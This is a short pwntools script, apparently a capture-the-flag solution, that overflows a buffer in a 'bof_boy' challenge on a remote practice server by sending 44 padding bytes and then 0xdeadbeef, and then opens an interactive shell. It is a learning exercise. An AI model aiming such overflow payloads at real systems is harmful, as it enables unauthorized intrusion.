#0x7fffffffe2fc - 0x7fffffffe2d0
from pwn import *

#s = process("./bof_boy")
s = remote("pwctf.dk", 12345)

payload = "A"*44
payload += p32(0xdeadbeef)
#payload += {'\xbe\ba\fe\ca'}
s.sendline(payload)
print "%s", payload
s.interactive()
